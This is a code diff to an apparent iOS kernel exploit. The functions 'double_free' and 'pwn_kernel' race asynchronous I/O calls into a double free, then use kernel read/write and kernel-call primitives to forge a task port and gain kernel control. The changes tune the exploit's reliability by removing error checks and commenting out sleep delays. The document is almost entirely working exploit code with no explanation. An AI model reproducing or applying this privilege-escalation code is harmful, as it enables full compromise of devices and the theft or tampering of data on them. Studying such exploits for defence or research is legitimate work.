@@ -121,17 +121,9 @@ void *double_free(void *a)
     
     while (should_run_race)
     {
-        err = lio_listio(mode, aio_list, nent, sigp);
+        lio_listio(mode, aio_list, nent, sigp);
         
-        for (uint32_t i = 0; i < nent; i++)
-        {
-            /* check the return err of the aio to fully consume it */
-            while (aio_error(aio_list[i]) == EINPROGRESS)
-            {
-                usleep(100);
-            }
-            err = aio_return(aio_list[i]);
-        }
+        aio_return(aio_list[0]);
     }
     
 exit:
@@ -923,7 +915,7 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
     kwrite64(curr_task + offsets.struct_offsets.itk_registered + 0x0, ptrs[0]);
     kwrite64(curr_task + offsets.struct_offsets.itk_registered + 0x8, ptrs[1]);
     
-    usleep(50000);
+    // usleep(50000);
     
     ret = mach_ports_lookup(mach_task_self(), &maps, &maps_num);
     if (ret != KERN_SUCCESS)
@@ -963,7 +955,7 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
     
     LOG("[+] remap addr: %llx", remap_addr);
 
-    usleep(500000);
+    // usleep(500000);
     
     mach_port_destroy(mach_task_self(), maps[0]);
     mach_port_destroy(mach_task_self(), maps[1]);
@@ -984,7 +976,7 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
     uint64_t new_port = zonemap_fix_addr(kcall(offsets.funcs.ipc_port_alloc_special, 1, ipc_space_kernel));
     LOG("new_port: %llx", new_port);
     
-    usleep(500000);
+    // usleep(500000);
 
     kcall(offsets.funcs.ipc_kobject_set, 3, new_port, remap_addr, IKOT_TASK);
     kcall(offsets.funcs.ipc_port_make_send, 1, new_port);
@@ -1051,8 +1043,11 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
     ret = KERN_SUCCESS;
 
 out:;
-    LOG("allowing logs to propagate...");
-    sleep(1);
+    if (ret != KERN_SUCCESS)
+    {
+        LOG("allowing logs to propagate...");
+        sleep(1);
+    }
 
     if (fakeport)
     {
